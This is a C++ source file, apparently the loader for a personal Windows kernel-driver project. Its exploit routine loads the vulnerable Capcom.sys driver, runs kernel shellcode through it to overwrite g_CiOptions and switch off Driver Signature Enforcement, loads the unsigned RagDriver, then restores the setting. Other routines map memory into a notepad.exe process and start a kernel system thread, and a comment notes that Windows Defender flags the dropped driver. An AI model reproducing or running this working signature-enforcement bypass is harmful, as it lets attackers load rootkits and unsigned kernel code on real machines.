#include <Windows.h>
#include <Psapi.h>
#include <memory>
#include <stdio.h>
#include <stdlib.h>
#include "Capcom.h"
#include "CapcomResource.h"
#include "LockedMemory.h"
#include "Common/RagCommon.h"
#include "Common/Misc.h"

#define SystemModuleInformation 0xB
#define CIPATH "%SYSTEMROOT%\\System32\\ci.dll"
#define RAG_DRIVER_NAME "RagDriver"
#define RAG_DRIVER_EXE_NAME "RagDriver.sys"
#define RAG_DEVICE_NAME LR"(\\.\RagDriver)"

template <auto fn> struct DeleteFunction {
	template <typename T> constexpr void operator()(T *arg) const { fn(arg); }
};

template <typename T, auto fn>
using my_unique_ptr = std::unique_ptr<T, DeleteFunction<fn>>;

using service_smart = my_unique_ptr<std::remove_pointer<SC_HANDLE>::type,
																		CloseServiceHandle>;
using handle_smart = my_unique_ptr<std::remove_pointer<HANDLE>::type,
																	 CloseHandle>;

__declspec(align(4096)) char g_pageToMap[4096 * 100] = "HexhexD";

std::string getTempDirPath() {
	char TempPath[MAX_PATH];
	GetTempPathA(MAX_PATH, TempPath);
	return TempPath;
}

void CPUIDStuff() {
	int CPUInfo[4] = {-1};

	char vendor[0x20] = {0};
	// A, B, C, D
	__cpuid(CPUInfo, 0);
	memcpy(vendor, &CPUInfo[1], 4);
	memcpy(vendor + 4, &CPUInfo[3], 4);
	memcpy(vendor + 8, &CPUInfo[2], 4);

	printf("CPU Vendor: %s, Maximum Input Value: %d\n", vendor, CPUInfo[0]);

	// Feature information
	__cpuid(CPUInfo, 1);
	// EBX
	CPUInfo[2] & (1 << 5) ? printf("Supports VMX\n") : printf("Doesn't support VMX\n");
	__cpuid(CPUInfo, 7);
	CPUInfo[2] & (1 << 5) ? printf("Supports VMX\n") : printf("Doesn't support VMX\n");
}

DWORD getPidFromName(const char* TargetName) {
	DWORD ProcessList[1024], BytesNeeded, Count;
	EnumProcesses(ProcessList, sizeof(ProcessList), &BytesNeeded);
	Count = BytesNeeded / sizeof(DWORD);

	for (int i = 0; i < Count; i++) {
		if (ProcessList[i] != 0) {
			handle_smart Process{
					OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
											FALSE,
											ProcessList[i])};
			if (Process.get()) {
				char ProcessName[MAX_PATH] = {0};
				GetModuleBaseNameA(Process.get(), NULL, ProcessName, MAX_PATH);
				if (_stricmp(ProcessName, TargetName) == 0) {
					printf("Found target process %s with pid %ld\n",
								 ProcessName,
								 ProcessList[i]);
					return ProcessList[i];
				}
			}
		}
	}
	return 0;
}

// Driver book stuff
bool openDeviceAndMapPhyiscalToTarget(int argc, const char *argv[]) {
	handle_smart Device{CreateFileW(RAG_DEVICE_NAME,
																	GENERIC_WRITE | GENERIC_READ,
																	FILE_SHARE_READ | FILE_SHARE_WRITE,
																	nullptr,
																	OPEN_EXISTING,
																	0,
																	nullptr)};
	if (Device.get() == INVALID_HANDLE_VALUE)
		return lastError("Can't open device in openDeviceMapPhyiscalToTarget");

	// Fill up input struct
	INPUT_PARAM Input;
	Input.ProcessId = getPidFromName("notepad.exe");
	if (!Input.ProcessId)
		return printf("Failed to get target PID, not talking to driver\n");
	Input.MiGetPteAddress= getSystemModuleBaseAddress("ntoskrnl.exe") + getSystemSymbolOffset("ntoskrnl.exe", "MiGetPteAddress");
	Input.PagedToBeMapped= (ULONGLONG)g_pageToMap;
	Input.MmPteBase = getSystemModuleBaseAddress("ntoskrnl.exe") + getSystemSymbolOffset("ntoskrnl.exe", "MmPteBase");

	DWORD BytesReturned;
	OVERLAPPED Overlapped;

	if (!DeviceIoControl(Device.get(),
											 IOCTL_MAP_PHYS_INTO_PROC,
											 &Input,
											 sizeof(Input),
											 NULL,
											 0,
											 &BytesReturned,
											 nullptr)) {
		return lastError("Failed to talk to driver ahhh");
	} else {
		printf("Success\n");
	}
	return 0;
}

bool openDeviceAndCreateSystemThread() {
	handle_smart Device {CreateFileW(RAG_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr)};
	if (Device.get() == INVALID_HANDLE_VALUE)
		return lastError("Can't open device in openDeviceAndCreateSystemThread");

	DWORD BytesReturned = 0;
	if (!DeviceIoControl(Device.get(), IOCTL_CREATE_SYSTEM_THREAD, nullptr, 0, nullptr, 0, &BytesReturned, nullptr))
		return lastError("Failed DeviceIoControl");

	return true;
}

// Install and start a driver in the current dir
bool loadDriver(const char *DriverName, std::string_view DriverPath) {
	char FullPath[MAX_PATH];
	if (!GetFullPathNameA((char *)DriverPath.data(), MAX_PATH, FullPath, NULL))
		return lastError("Failed to get driver full path using: " + std::string(DriverPath));

	using service_smart = my_unique_ptr<std::remove_pointer<SC_HANDLE>::type,
																			CloseServiceHandle>;
	service_smart SCM(OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS));
	if (!SCM)
		return lastError("Can't open SCManager");

	service_smart Service{CreateServiceA(SCM.get(),
																			 DriverName,
																			 DriverName,
																			 SERVICE_ALL_ACCESS,
																			 SERVICE_KERNEL_DRIVER,
																			 SERVICE_DEMAND_START,
																			 SERVICE_ERROR_NORMAL,
																			 FullPath,
																			 NULL,
																			 NULL,
																			 NULL,
																			 NULL,
																			 NULL)};
	if (!Service) {
		// Already installed
		if (GetLastError() != 1073) {
			return lastError("Failed to install service ");
		}
	}
	Service = service_smart{OpenServiceA(SCM.get(), DriverName, GENERIC_ALL)};
	if (!Service) {
		return lastError("Failed to open serivce");
	}

	SERVICE_STATUS SS;
	ControlService(Service.get(), SERVICE_CONTROL_STOP, &SS);
	while (SS.dwCurrentState != SERVICE_STOPPED) {
		printf("Waiting for driver to stop\n");
		Sleep(100);
	}
	// Delete it and install again to make sure path is correct
	// Mark it for deletion
	if (DeleteService(Service.get()))
		printf("Succesfully deleted service\n");
	else
		return lastError("Failed to delete service\n");
	// Close handle so service can be deleted
	Service.reset();

	auto NewService = service_smart{CreateServiceA(SCM.get(),
																								 DriverName,
																								 DriverName,
																								 SERVICE_ALL_ACCESS,
																								 SERVICE_KERNEL_DRIVER,
																								 SERVICE_DEMAND_START,
																								 SERVICE_ERROR_NORMAL,
																								 FullPath,
																								 NULL,
																								 NULL,
																								 NULL,
																								 NULL,
																								 NULL)};

	if (!StartService(NewService.get(), 0, NULL))
		return lastError("Failed to start service");
	printf("Succesfully started %s\n", DriverName);
	return true;
}

bool exploit() {
	// Drops a file from memory which get detected by windows defender immidiately
	// lmao createFileFromMemory(getTempDirPath() + "Capcom.sys", (char *)CapcomDriver, sizeof(CapcomDriver));
	if (!loadDriver("Capcom", "Capcom.sys"))
		return false;
	HANDLE Device = Capcom::openDevice();
	if (Device == INVALID_HANDLE_VALUE)
		return lastError("Can't open device");

	// Get address of g_CiOptions and disable DSE
	UINT64 CiOptionsAddr = getSystemModuleBaseAddress("CI.dll") + getSystemSymbolOffset("CI.dll", "g_CiOptions");
	LOG("g_CiOptions at: %llX\n", CiOptionsAddr);

	// Access RtlInitUnicodeString so it's paged in
	UNICODE_STRING Temp;
	RtlInitUnicodeString(&Temp, L"PAGE ME IN");
	auto ForcePagedIn = RtlInitUnicodeString;
	printf("RtlInitUnicodeString at: %p\n", ForcePagedIn);
	Capcom::run(Device, Shellcode::initFuncPtrs, nullptr);
	Capcom::run(Device, Shellcode::helloWorld, nullptr);
	Capcom::run(Device, Shellcode::disableDSE, &CiOptionsAddr);

	loadDriver(RAG_DRIVER_NAME, RAG_DRIVER_EXE_NAME);

	Capcom::run(Device, Shellcode::restoreDSE, &CiOptionsAddr);

	CloseHandle(Device);
	return true;
}

int main(int argc, const char *argv[]) {
	printf("Setting working set size\n");
	if (SetProcessWorkingSetSizeEx(GetCurrentProcess(), 1000000, 1000000, QUOTA_LIMITS_HARDWS_MAX_DISABLE) == 0)
		return lastError("Failed to set working set size");
	if (!lockRange()) {
		printf("Lock CODE in memory failed, abort\n");
		exit(999);
	}
	if (!VirtualLock(g_pageToMap, sizeof(g_pageToMap))) {
		return lastError("Lock DATA in memory failed, abort");
	}

	if (argc >= 2 && strstr(argv[1], "-load")) {
		exploit();
	} else if(argc >= 2 && strstr(argv[1], "-test")) {
		CPUIDStuff();
	} else {
		// openDeviceAndMapPhyiscalToTarget(argc, argv);
		openDeviceAndCreateSystemThread();
	}
	return 0;
}
